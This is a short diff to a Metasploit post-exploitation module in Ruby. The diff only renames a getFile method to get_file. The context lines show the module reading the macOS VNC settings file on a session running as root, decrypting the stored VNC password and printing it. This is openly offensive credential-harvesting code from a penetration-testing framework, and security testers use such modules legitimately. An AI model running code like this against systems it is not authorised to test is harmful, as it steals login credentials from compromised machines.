@@ -41,7 +41,7 @@ class MetasploitModule < Msf::Post
     return str
   end
 
-  def getFile(filename)
+  def get_file(filename)
     begin
       client.fs.file.stat(filename)
       config = client.fs.file.new(filename,'r')
@@ -67,7 +67,7 @@ class MetasploitModule < Msf::Post
     print_status("This session is running as root!")
     print_status("Checking VNC Password...")
     vncsettings_path = '/Library/Preferences/com.apple.VNCSettings.txt'
-    passwd_encrypt = getFile("#{vncsettings_path}")
+    passwd_encrypt = get_file("#{vncsettings_path}")
     final_passwd = decrypt_hash("#{passwd_encrypt}")
     if !final_passwd.nil?
       print_good("Password Found: #{final_passwd}")
